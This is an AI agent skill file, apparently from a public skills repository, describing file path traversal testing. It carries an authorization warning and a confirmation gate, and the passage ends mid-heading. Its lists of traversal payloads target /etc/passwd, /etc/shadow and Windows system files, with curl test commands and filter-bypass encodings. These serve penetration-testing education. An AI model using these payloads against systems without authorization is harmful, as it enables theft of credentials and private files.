---
name: file-path-traversal
description: Identify and exploit file path traversal (directory traversal) vulnerabilities that allow attackers to read arbitrary files on the server, potentially including sensitive configuration files, credenti
category: Security & Systems
source: antigravity
tags: [python, pdf, api, ai, agent, automation, workflow, template, document, image]
url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/file-path-traversal
---

> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target, ask for the exact target URL, IP, account, or resource and confirmation of written authorization and permitted scope.
> Show the exact command(s), explain their expected effect, and wait for explicit confirmation in the current conversation.
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

# File Path Traversal Testing

## Purpose

Identify and exploit file path traversal (directory traversal) vulnerabilities that allow attackers to read arbitrary files on the server, potentially including sensitive configuration files, credentials, and source code. This vulnerability occurs when user-controllable input is passed to filesystem APIs without proper validation.

## Prerequisites

### Required Tools
- Web browser with developer tools
- Burp Suite or OWASP ZAP
- cURL for testing payloads
- Wordlists for automation
- ffuf or wfuzz for fuzzing

### Required Knowledge
- HTTP request/response structure
- Linux and Windows filesystem layout
- Web application architecture
- Basic understanding of file APIs

## Outputs and Deliverables

1. **Vulnerability Report** - Identified traversal points and severity
2. **Exploitation Proof** - Extracted file contents
3. **Impact Assessment** - Accessible files and data exposure
4. **Remediation Guidance** - Secure coding recommendations

## Core Workflow

### Phase 1: Understanding Path Traversal

Path traversal occurs when applications use user input to construct file paths:

```php
// Vulnerable PHP code example
$template = "blue.php";
if (isset($_COOKIE['template']) && !empty($_COOKIE['template'])) {
    $template = $_COOKIE['template'];
}
include("/home/user/templates/" . $template);
```

Attack principle:
- `../` sequence moves up one directory
- Chain multiple sequences to reach root
- Access files outside intended directory

Impact:
- **Confidentiality** - Read sensitive files
- **Integrity** - Write/modify files (in some cases)
- **Availability** - Delete files (in some cases)
- **Code Execution** - If combined with file upload or log poisoning

### Phase 2: Identifying Traversal Points

Map application for potential file operations:

```bash
# Parameters that often handle files
?file=
?path=
?page=
?template=
?filename=
?doc=
?document=
?folder=
?dir=
?include=
?src=
?source=
?content=
?view=
?download=
?load=
?read=
?retrieve=
```

Common vulnerable functionality:
- Image loading: `/image?filename=23.jpg`
- Template selection: `?template=blue.php`
- File downloads: `/download?file=report.pdf`
- Document viewers: `/view?doc=manual.pdf`
- Include mechanisms: `?page=about`

### Phase 3: Basic Exploitation Techniques

#### Simple Path Traversal

```bash
# Basic Linux traversal
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd

# Windows traversal
..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts

# URL encoded
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd  # Double encoding

# Test payloads with curl
curl "http://target.com/image?filename=../../../etc/passwd"
curl "http://target.com/download?file=....//....//....//etc/passwd"
```

#### Absolute Path Injection

```bash
# Direct absolute path (Linux)
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ

# Direct absolute path (Windows)
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\boot.ini
```

### Phase 4: Bypass Techniques

#### Bypass Stripped Traversal Sequences

```bash
# When ../ is stripped once
....//....//....//etc/passwd
....\/....\/....\/etc/passwd

# Nested traversal
..././..././..././etc/passwd
....//....//etc/passwd

# Mixed encoding
..%2f..%2f..%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

#### Bypass Extension Validation

```bash
# Null byte injection (older PHP versions)
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png

# Path truncation
../../../etc/passwd...............................

# Double extension
../../../etc/passwd.jpg.php
```

#### Bypass Base Directory Validation

```bash
# When path must start with expected directory
/var/www/images/../../../etc/passwd

# Expected path followed by traversal
images/../../../etc/passwd
```

#### Bypass Blacklist Filters

```bash
# Unicode/UTF-8 encoding
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cetc/passwd

# Overlong UTF-8 encoding
%c0%2e%c0%2e%c0%af

# URL encoding variations
%2e%2e/
%2e%2e%5c
..%5c
..%255c

# Case variations (Windows)
....\\....\\etc\\passwd
```

### Phase 5: Linux Targe
